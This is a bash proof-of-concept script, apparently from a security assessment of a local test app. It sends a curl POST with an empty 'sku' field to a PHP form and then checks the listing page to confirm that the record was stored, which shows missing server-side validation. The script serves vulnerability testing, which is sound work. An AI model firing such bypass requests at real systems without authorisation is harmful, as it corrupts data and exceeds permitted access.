#!/bin/bash

# POC: Data Validation Bypass - Empty Required SKU Field Accepted
# This script demonstrates that the SKU addition form accepts empty/NULL values
# for the required 'SKU' field despite HTML validation, due to missing server-side validation

TARGET_URL="http://localhost:8081/sku_add.php"
SYSTEM_URL="http://localhost:8081/sku_system.php"

echo "========================================"
echo "Data Validation Bypass - Empty SKU POC"
echo "========================================"
echo ""

# Test 1: Submit form with empty SKU value (follow redirects)
echo "[*] Test 1: Submitting form with empty SKU field..."
echo "[*] Target: POST $TARGET_URL"
echo "[*] Payload: sku=&name=Test_No_SKU&description=Test"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'sku=&name=Test_No_SKU&description=Test' \
  -L)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] Response HTTP Code: $HTTP_CODE"
echo ""

# Check if successful (200) - indicating validation was bypassed
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
  echo "[✓] Server accepted the request (HTTP $HTTP_CODE)"
  echo ""
  
  # Test 2: Verify the record was actually created by checking the system page
  echo "[*] Test 2: Verifying record was created in the system..."
  echo "[*] Checking: $SYSTEM_URL"
  echo ""
  
  SYSTEM_RESPONSE=$(curl -s "$SYSTEM_URL")
  
  # Check if we can find the recently created record with empty SKU
  if echo "$SYSTEM_RESPONSE" | grep -q "Test_No_SKU"; then
    echo "[✓] CONFIRMED: Record with 'Test_No_SKU' found in system"
    echo "[✓] VULNERABILITY CONFIRMED: Empty SKU values can be created"
    echo ""
    echo "[*] Evidence: Record successfully created and stored in database"
    
    # Count how many records exist to show the creation succeeded
    RECORD_COUNT=$(echo "$SYSTEM_RESPONSE" | grep -c "<tr>" || echo "unknown")
    echo "[*] Total SKU records in system: $RECORD_COUNT"
    
    echo ""
    echo "[✓] VALIDATION BYPASS CONFIRMED"
    echo "[✓] Server-side validation is missing on required 'SKU' field"
    exit 0
    
  else
    echo "[!] Warning: Could not verify record in list, checking response directly..."
    
    # Maybe we got redirected - check if body contains success indicators
    if echo "$BODY" | grep -q "sku_system" || echo "$BODY" | grep -q "Test_No_SKU"; then
      echo "[✓] Response contains reference to created record"
      echo "[✓] VALIDATION BYPASS LIKELY CONFIRMED"
      exit 0
    else
      echo "[!] Could not confirm record creation"
      exit 1
    fi
  fi
  
else
  echo "[!] Unexpected response code: $HTTP_CODE"
  exit 1
fi